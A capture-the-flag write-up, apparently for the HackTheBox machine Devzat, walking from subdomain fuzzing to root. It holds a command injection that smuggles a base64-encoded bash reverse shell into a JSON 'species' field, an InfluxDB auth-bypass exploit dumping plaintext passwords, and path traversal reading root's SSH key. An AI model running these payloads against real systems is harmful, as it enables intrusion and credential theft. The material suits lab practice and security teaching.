#### Enumeration
nmap returns the following information about our target.
```

Nmap done: 1 IP address (1 host up) scanned in 162.05 seconds
```
From the scan we get the name of the domain so we quickly add that to /etc/hosts

- Checking port 80 we get a chatting tool .At this point it is not so helpful.
 <img src="../images/articles/devzat/web.png" />
- I did bruteforce the directories and  didn't find anything juicy.
- I did an nmap scan for the UDP ports and got nothing useful.
- Going ahead i did subdomain enumeration
#### Subdomain enumeration
```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devzat.htb/ -H "Host:  FUZZ.devzat.htb" --hw 26

```
- Perfect i found this  subdomain . Add it to /etc/hosts
```

```
- We get this website
<img src="../images/articles/devzat/pet.png" />
This subdomain has a functionality to add a pet. Capturing the request with burpsuite i was able to do some remote code execution (RCE)
<img src="../images/articles/devzat/burp.png" />

#### Getting reverse shell
Lets modify the species parameter, we have to use some command to establish a reverse shell in base64 and then we will decode it and execute it on the victim machine.
<img src="../images/articles/devzat/term.png" />
```
{
"name":"cat",
"species":"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44LzQ0NDQgMD4mMQo=|base64 -d|bash`"
}
```
Before sending the request we open a netcat listener to establish a connection with our reversshell.
```
rlwrap nc -nlvp 4444
```
#### In reverseshell
<img src="../images/articles/devzat/term1.png" />
Now we are the user Patrick, after looking for a while I realized that we have to become the user Catherine, since as Patrick we cannot do much.
- To establish a more nicer connection ,i get my public ssh keys to patrick's authorized keys so i can connect using ssh.
<img src="../images/articles/devzat/term2.png" />
Now we can test the chatting tool we saw on port 80 with user Catherine and patrick.
```
 ssh -l [username] devzat.htb -p 8000 
```
With user Catherine.
```
 ssh -l catherine localhost -p 8000 
```
We get the following messages ..
```
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now üëî
patrick: That's perfectly fine üëç  You'll need a password I gave you last time.
catherine: k
patrick: I left the source for your review in backups.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. See ya!
devbot: patrick has left the chat

```
We noticed that we have a development program in the port 8443, we keep this information for later, and that we have a password in the backup directory.

Now trying the same with user patrick .
I get the following messages.
```
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool üëç
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat

```
Once we read this chat we find out that there is an influxdb configured. Investigating about it and carrying out several tests we finally concluded that it is vulnerable. We get the following github exploit.
[Github Exploit](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git)
We download it and install the requirements. Before executing it, we must perform a port redirection to our attacking machine, specifically port 8086, since it is the one used by the database.
```
ssh -i id_rsa_patrick -L 8086:localhost:8086 patrick@devzat.htb
```
Once we run the exploit, with a username wordlist we view 2 databases, i tried I have tried with the 2 and with several tables in the end I have come to the conclusion that the correct ones are the following. We select the database devzat
```
 - using CVE-2019-20933

Host (default: localhost): 
Port (default: 8086): 
Username <OR> path to username file (default: users.txt): 

Bruteforcing usernames ...
[v] admin

Host vulnerable !!!

Databases:

1) devzat
2) _internal
```
Then we can dump all infomation from user table.
```
[admin@127.0.0.1/devzat] $ select * from "USER";
{
    "results": [
        {
            "statement_id": 0
        }
    ]
}

{
    "results": [
        {
            "series": [
                {

                        "username"
                    ],

                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oog*************",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}

```
Now lets login as user catherine with the password obtained .

#### Privelege Escalation :accept: 
After conducting several investigations, I have realized that we can indeed see port 8443 open and as we had seen before in the chats that we had a program in development
```
catherine@devzat:/home$ netstat -punta | grep LISTEN
(No info could be read for "-p": geteuid()=1001 but you should be root.)

tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -

```
We had been told that the project was in the backup directory, now we will proceed to see which project it is, we saw the following files in /var/backups.
```
catherine@devzat:/var/backups$ ls -al
total 1356

```
The file devzat-dev.zip catches my attention, since with the tag of ‚Äúdev‚Äù I can guess that it was this file they were talking about. We are going to copy this file to our home directory and we are going to see what it is about.

After reading all the files I come to the conclusion that it is the same program that is in production, but in the commands.go file, we see that there is a function that is not in the project in production. We see that the function is called fileCommand, and the command is called file, this allows us to read files and display them on the screen, but a password is necessary, but in the same code we can see that password.
```
func fileCommand(u *user, args []string) {                                                                                                                                                                                                   
        if len(args) < 1 {                                                                                                                                                                                                                   
                u.system("Please provide file to print and the password")                                                                                                                                                                    
                return                                                                                                                                                                                                                       
        }                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                             
        if len(args) < 2 {                                                                                                                                                                                                                   
                u.system("You need to provide the correct password to use this function")
                return
        }

        path := args[0]
        pass := args[1]

        // Check my secure password
        if pass != "Ce********************" {
                u.system("You did provide the wrong password")
                return
        }
```
Therefore, if we enter the program that is running on port 8443, we can read privileged files with a password. Let‚Äôs try.
```
ssh -l  catherine localhost -p 8443
```
We see that the command is indeed there, so we are going to take advantage of it.
```
[SYSTEM] file - Paste a files content directly to chat [alpha]
```
Now we can be able to see id_rsa of root and connect via ssh to it.
```
catherine: /file ../../root/.ssh/id_rsa PASSWORD
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxO***************************************************************
[SYSTEM] HAAAAAt***************************************************************
[SYSTEM] AAAECtF***************************************************************
[SYSTEM] Q0ekw7Z********************************************
[SYSTEM] -----END OPENSSH PRIVATE KEY-----
```
Now lets connect as root :+1: 
```
ssh -i id_root root@devzat.htb 
```
Grab the root flag :)
